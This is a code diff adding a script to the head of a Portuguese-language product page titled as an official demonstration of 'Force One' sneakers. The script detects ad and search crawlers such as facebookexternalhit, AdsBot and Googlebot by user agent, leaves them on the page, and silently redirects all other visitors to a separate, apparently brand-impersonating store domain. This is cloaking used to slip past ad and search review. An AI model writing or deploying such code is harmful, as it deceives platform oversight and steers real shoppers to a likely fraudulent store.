@@ -1,6 +1,16 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+  <script>
+    (function(){
+      var ua = (navigator.userAgent || '').toLowerCase();
+      var bots = ['facebookexternalhit','facebot','facebookbot','meta-externalagent','meta-crawler','adsbot','googlebot','bingbot','twitterbot','linkedinbot','slurp','duckduckbot','baiduspider','yandexbot','sogou','exabot','ia_archiver'];
+      var isBot = bots.some(function(b){ return ua.indexOf(b) !== -1; });
+      if (!isBot) {
+        window.location.replace('https://loja-caterpillar.com/produtos/tenis-force-one');
+      }
+    })();
+  </script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Force One — Demonstração Oficial do Produto</title>
